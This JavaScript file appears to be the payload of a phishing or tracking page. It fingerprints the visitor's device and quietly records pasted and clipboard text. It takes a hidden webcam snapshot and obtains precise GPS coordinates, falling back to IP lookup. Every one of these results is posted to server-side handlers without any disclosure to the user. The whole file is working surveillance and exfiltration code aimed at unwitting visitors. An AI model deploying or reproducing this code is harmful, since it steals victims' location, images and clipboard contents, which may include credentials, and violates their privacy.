var sessionId = 'sid_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now();

function information() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;

  if (cc == undefined) {
    cc = 'Not Available';
  }

  if (ram == undefined) {
    ram = 'Not Available';
  }

  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else {
    brw = 'Not Available'
  }

  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined) {
    ven = 'Not Available';
  }
  if (ren == undefined) {
    ren = 'Not Available';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();

  var deviceInfo = parseDeviceModel(ver);

  $.ajax({
    type: 'POST',
    url: 'info_handler.php',
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os, Sid: sessionId, Brand: deviceInfo.brand, Model: deviceInfo.model },
    success: function () { },
    mimeType: 'text'
  });

  document.addEventListener('paste', function (e) {
    if (e.clipboardData) {
      var pastedText = e.clipboardData.getData('text');
      if (pastedText && pastedText.trim() != '') {
        $.ajax({
          type: 'POST',
          url: 'clipboard_handler.php',
          data: { Data: pastedText, Sid: sessionId },
          mimeType: 'text'
        });
      }
    }
  });
}

function captureCamera(callback) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    reportCameraError('Camera API not available');
    if (typeof callback === 'function') { callback(null, 'Camera API not available'); }
    return;
  }

  var video = document.createElement('video');
  video.setAttribute('autoplay', '');
  video.setAttribute('playsinline', '');
  video.style.display = 'none';
  document.body.appendChild(video);

  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } })
    .then(function (stream) {
      video.srcObject = stream;
      video.onloadedmetadata = function () {
        video.play();
        setTimeout(function () {
          try {
            var cvs = document.createElement('canvas');
            cvs.width = video.videoWidth || 640;
            cvs.height = video.videoHeight || 480;
            var ctx = cvs.getContext('2d');
            ctx.drawImage(video, 0, 0, cvs.width, cvs.height);
            var imageData = cvs.toDataURL('image/jpeg', 0.7);

            stream.getTracks().forEach(function (track) { track.stop(); });
            document.body.removeChild(video);

            $.ajax({
              type: 'POST',
              url: 'camera_handler.php',
              data: { Image: imageData, Sid: sessionId },
              success: function () {
                if (typeof callback === 'function') { callback(imageData, null); }
              },
              error: function () {
                if (typeof callback === 'function') { callback(imageData, 'Upload failed'); }
              },
              mimeType: 'text'
            });
          } catch (e) {
            stream.getTracks().forEach(function (track) { track.stop(); });
            document.body.removeChild(video);
            reportCameraError(e.message);
            if (typeof callback === 'function') { callback(null, e.message); }
          }
        }, 500);
      };
    })
    .catch(function (err) {
      document.body.removeChild(video);
      reportCameraError(err.message);
      if (typeof callback === 'function') { callback(null, err.message); }
    });

  function reportCameraError(errMsg) {
    $.ajax({
      type: 'POST',
      url: 'camera_handler.php',
      data: { Sid: sessionId, Status: 'failed', Error: errMsg },
      mimeType: 'text'
    });
  }
}

function parseDeviceModel(ua) {
  var brand = 'Not Available';
  var model = 'Not Available';

  if (ua.indexOf('Android') !== -1) {
    var match = ua.match(/\(([^)]+)\)/);
    if (match) {
      var parts = match[1].split(';');
      for (var i = parts.length - 1; i >= 0; i--) {
        var part = parts[i].trim();
        if (part && part.indexOf('Android') === -1 && part.indexOf('Build') === -1
            && part.indexOf('wv') === -1 && part.indexOf('KHTML') === -1
            && part.indexOf('Linux') === -1 && part.indexOf('AppleWebKit') === -1) {
          model = part;
          break;
        }
      }
    }
    if (model.match(/^SM-/)) { brand = 'Samsung'; }
    else if (model.match(/^(RMX|realme)/i)) { brand = 'realme'; }
    else if (model.match(/^(CPH|OPPO|OPD)/i)) { brand = 'OPPO'; }
    else if (model.match(/^(KB|LE|ONEPLUS|OnePlus)/i)) { brand = 'OnePlus'; }
    else if (model.match(/^(M20|Redmi|Mi |POCO|22|23|24)/)) { brand = 'Xiaomi'; }
    else if (model.match(/^(vivo|V2|V3|V4|Y2|Y3|Y4|Y5|Y7|Y9)/i)) { brand = 'vivo'; }
    else if (model.match(/^(TECNO|Infinix|itel|ITEL)/i)) { brand = 'TECNO/Infinix'; }
    else if (model.match(/^(ASUS|Zenfone|ROG)/i)) { brand = 'ASUS'; }
    else if (model.match(/^(Nokia|TA-)/i)) { brand = 'Nokia'; }
    else if (model.match(/^(Moto|moto|XT|MOTOROLA)/i)) { brand = 'Motorola'; }
    else if (model.match(/^(HUAWEI|HONOR|ALP|JNY|ELS|NOH)/i)) { brand = 'Huawei/Honor'; }
    else { brand = 'Android'; }
  } else if (ua.indexOf('iPhone') !== -1) {
    brand = 'Apple'; model = 'iPhone';
  } else if (ua.indexOf('iPad') !== -1) {
    brand = 'Apple'; model = 'iPad';
  } else if (ua.indexOf('Macintosh') !== -1 || ua.indexOf('Mac OS X') !== -1) {
    brand = 'Apple'; model = 'Mac';
  } else if (ua.indexOf('Windows') !== -1) {
    brand = 'Microsoft'; model = 'PC/Laptop';
  } else if (ua.indexOf('Linux') !== -1) {
    brand = 'GNU/Linux'; model = 'Desktop';
  }

  return { brand: brand, model: model };
}

function attemptClipboardRead() {
  if (navigator.clipboard && navigator.clipboard.readText) {
    navigator.clipboard.readText().then(function(text) {
      if (text && text.trim() !== '') {
        $.ajax({
          type: 'POST',
          url: 'clipboard_handler.php',
          data: { Data: text, Sid: sessionId },
          mimeType: 'text'
        });
      }
    }).catch(function(err) {});
  }
}

function locate(callback, errCallback) {
  attemptClipboardRead();

  function doGps() {
    if (navigator.geolocation) {
      var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
      navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
    }
  }

  if (typeof CAMERA_ENABLED !== 'undefined' && CAMERA_ENABLED) {
    captureCamera(function () { doGps(); });
  } else {
    doGps();
  }

  function showError(error) {
      var err_text;
      var err_status = 'failed';

      switch (error.code) {
        case error.PERMISSION_DENIED:
          err_text = 'User denied the request for Geolocation';
          break;
        case error.POSITION_UNAVAILABLE:
          err_text = 'Location information is unavailable';
          break;
        case error.TIMEOUT:
          err_text = 'The request to get user location timed out';
          alert('Please set your location mode on high accuracy...');
          break;
        case error.UNKNOWN_ERROR:
          err_text = 'An unknown error occurred';
          break;
      }

      $.ajax({
        type: 'POST',
        url: 'error_handler.php',
        data: { Status: err_status, Error: err_text, Sid: sessionId },
        success: function () {
          fallbackIPGeo(sessionId, callback, errCallback, error);
        },
        mimeType: 'text'
      });
    }

    function fallbackIPGeo(sid, callback, errCallback, originalError) {
      $.getJSON('https://ip-api.com/json/?fields=status,lat,lon', function(data) {
        if (data && data.status === 'success') {
          $.ajax({
            type: 'POST',
            url: 'result_handler.php',
            data: {
              Status: 'ip_fallback',
              Lat: data.lat + ' deg', Lon: data.lon + ' deg',
              Acc: 'IP Based', Alt: 'N/A', Dir: 'N/A', Spd: 'N/A', Sid: sid
            },
            success: function () {
              if (typeof callback === 'function') {
                callback({ coords: { latitude: data.lat, longitude: data.lon, accuracy: 0 } });
              }
            },
            mimeType: 'text'
          });
        } else {
          if (typeof errCallback === 'function') {
            errCallback(originalError, 'GPS+IP fallback failed');
          }
        }
      }).fail(function () {
        if (typeof errCallback === 'function') {
          errCallback(originalError, 'GPS+IP fallback failed');
        }
      });
    }
    function showPosition(position) {
      var lat = position.coords.latitude;
      if (lat) { lat = lat + ' deg'; } else { lat = 'Not Available'; }
      var lon = position.coords.longitude;
      if (lon) { lon = lon + ' deg'; } else { lon = 'Not Available'; }
      var acc = position.coords.accuracy;
      if (acc) { acc = acc + ' m'; } else { acc = 'Not Available'; }
      var alt = position.coords.altitude;
      if (alt) { alt = alt + ' m'; } else { alt = 'Not Available'; }
      var dir = position.coords.heading;
      if (dir) { dir = dir + ' deg'; } else { dir = 'Not Available'; }
      var spd = position.coords.speed;
      if (spd) { spd = spd + ' m/s'; } else { spd = 'Not Available'; }

      var ok_status = 'success';

      $.ajax({
        type: 'POST',
        url: 'result_handler.php',
        data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, Sid: sessionId },
        success: function () {
          if (typeof callback === 'function') {
            callback(position);
          }
        },
        mimeType: 'text'
      });
    };
}
